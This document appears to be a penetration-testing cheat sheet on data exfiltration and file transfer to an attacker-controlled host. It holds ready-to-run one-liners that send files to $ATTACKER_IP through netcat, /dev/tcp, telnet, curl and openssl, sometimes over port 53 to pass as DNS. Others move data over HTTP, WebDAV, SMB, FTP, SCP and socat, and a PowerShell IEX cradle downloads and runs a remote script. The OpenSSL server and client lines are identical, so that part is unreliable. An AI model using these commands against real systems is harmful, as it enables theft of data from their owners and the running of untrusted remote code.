# 📂 Exfiltration

> In penetration testing, file transfer is an essential part of the process. It can be used to move files between systems, upload payloads, and exfiltrate data.

## DNS

```bash
# Server
nc -lvnp 53 > filename
```

### Client

::: code-group

```bash [nc]
nc $ATTACKER_IP 53 < filename
```

```bash [Unix Sock]
cat file > /dev/tcp/$ATTACKER_IP/53
cat file | telnet $ATTACKER_IP 53
```

```bash [curl / openssl]
curl --data-binary @file telnet://$ATTACKER_IP:53
openssl s_client -quiet -connect $ATTACKER_IP:53 < file
```

:::

## HTTP

:::code-group

```bash [uploadserver]
# Server
pip3 install uploadserver python3 -m uploadserver
python3 -m uploadserver

## TLS
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```bash [updog]
updog --ssl --port 9090 --password "$HTTP_PASSWORD" --directory $SHARE_PATH
```

```bash [uploader]
uploader --port 8081 -f chisel.exe --os windows -p 8080 --payload Iwr -o imfile.exe
```

:::

```bash
# Client
curl --data-binary @file $URL
```

### WebDAV

```bash
# Server
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=$SHARE_PATH --auth=anonymous

# CLient
curl -T file $URL
```

## SMB

```bash
# Server
sudo impacket-smbserver $SHARE_NAME -smb2support $SMB_SHARE_PATH -user $SMB_USER -password $SMB_PASSWORD

# Client
net use Z: \\$ATTACKER_IP\$SHARE_NAME /user:$SMB_USER "$SMB_PASSWORD"
```

## FTP

```bash
# Server
sudo python3 -m pyftpdlib --port 21

# Client
ftp -v -n -s:ftpcommand.txt
```

## SCP

```bash
scp /path/to/file user@$ATTACKER_IP:/path/to/dir
```

## PowerShell

### Download

```powershell
(New-Object Net.WebClient).DownloadFile('$URL','<output_file>')
```

### Upload

```powershell
IEX(New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1>') Invoke-FileUpload -Uri $URL -File <file>
```

## Linux

::: code-group

```bash [cat]
# Download
cat < /dev/tcp/$ATTACKER_IP/$PORT > file

# Upload
cat file > /dev/tcp/$ATTACKER_IP/$PORT
```

```bash [Unix Pipe]
exec 3<>/dev/tcp/$ATTACKER_IP/$PORT
echo -e "GET /chisel HTTP/1.1\n\n">&3
cat <&3
```

:::

## SSL/TLS

### Create certificate

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

### Socat

```bash
# Server
socat ssl:$ATTACKER_IP:$PORT stdio

# Client
socat ssl:$ATTACKER_IP:$PORT readline
```

### OpenSSL

```bash
# Server
openssl s_client -quiet -connect $ATTACKER_IP:$PORT

# Client
openssl s_client -quiet -connect $ATTACKER_IP:$PORT
```
